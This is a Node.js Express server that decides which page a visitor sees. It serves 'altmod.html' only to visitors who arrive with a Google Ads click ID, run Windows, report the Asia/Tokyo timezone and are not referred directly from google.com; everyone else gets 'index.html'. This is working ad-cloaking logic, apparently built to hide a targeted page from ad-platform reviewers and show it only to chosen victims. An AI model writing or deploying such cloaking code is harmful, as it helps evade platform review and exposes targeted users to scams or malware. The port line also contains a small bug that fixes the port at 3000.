const express = require("express");
const cors = require("cors");
const path = require("path");
const app = express();
const PORT = 3000 || process.env.PORT;

// List of allowed frontend origins for CORS
const allowedOrigins = [
  "https://thaibasiljp.com",
  "https://sakiinstant.shop",
  "https://sakiinstant.shop/",
  "http://sakiinstant.shop",
  "http://sakiinstant.shop/",
  "http://thaibasiljp.com",
  "http://127.0.0.1:5501",
  "http://127.0.0.1:5500",
];

// Normalize referer function to handle trailing slashes
const normalizeReferer = (referer) => referer?.replace(/\/+$/, "");

// Helper function to check if the user's OS is Windows
const isWindowsOS = (userAgent) => {
  return userAgent.includes("Windows");
};

// Helper function to check if the referer is allowed
const isAllowedReferrer = (referer) => {
  if (!referer) return true; // Proceed if no referer

  const hostname = new URL(referer).hostname;
  // Block direct visits from www.google.com
  if (hostname === "www.google.com") {
    return false;
  }
  // Allow visits from googleads.g.doubleclick.net or any other source
  return true;
};

// Helper function to check for the gclid parameter
const hasGclidParam = (req) => {
  return !!req.query.gclid;
};

// CORS configuration
const corsOptions = {
  origin: function (origin, callback) {
    console.log(`Origin: ${origin}`); // Log the origin for debugging
    if (allowedOrigins.includes(origin) || !origin) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
};

// Apply the CORS middleware
app.use(cors(corsOptions));

// Middleware to parse JSON bodies
app.use(express.json());

// Middleware to parse URL-encoded bodies (needed for gclid parameter in URL)
app.use(express.urlencoded({ extended: true }));

// Route to handle the POST request
app.post(
  "/",
  (req, res) => {
    const referer = normalizeReferer(req.headers.referer);
    const userAgent = req.headers["user-agent"]; // Get the User-Agent from the request headers
    const { timezone } = req.body;

    console.log(`Referer: ${referer}, Timezone: ${timezone}, User-Agent: ${userAgent}`);

    // Check all conditions: gclid parameter, Windows OS, allowed referrer, and timezone
    if (hasGclidParam(req) &&
        isWindowsOS(userAgent) &&
        isAllowedReferrer(referer) &&
        timezone === "Asia/Tokyo") {
      res.sendFile(path.join(__dirname, "altmod.html"));
    } else {
      res.sendFile(path.join(__dirname, "index.html"));
    }
  }
);

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
